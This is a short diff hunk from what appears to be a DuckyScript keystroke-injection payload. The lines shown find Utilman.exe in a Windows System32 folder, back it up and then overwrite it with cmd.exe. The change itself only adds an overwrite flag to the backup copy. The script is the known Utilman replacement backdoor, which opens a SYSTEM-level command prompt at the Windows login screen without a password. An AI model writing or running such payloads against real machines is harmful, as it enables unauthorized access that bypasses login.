@@ -60,7 +60,7 @@ STRINGLN         echo Utilman.exe found in drive %d:
 STRINGLN         cd /d %d:\Windows\System32\
 STRINGLN     )
 STRINGLN )
-STRINGLN copy Utilman.exe  Utilman2.exe
+STRINGLN copy Utilman.exe  Utilman2.exe /y
 STRINGLN copy  cmd.exe  Utilman.exe /y
 
 STRINGLN exit
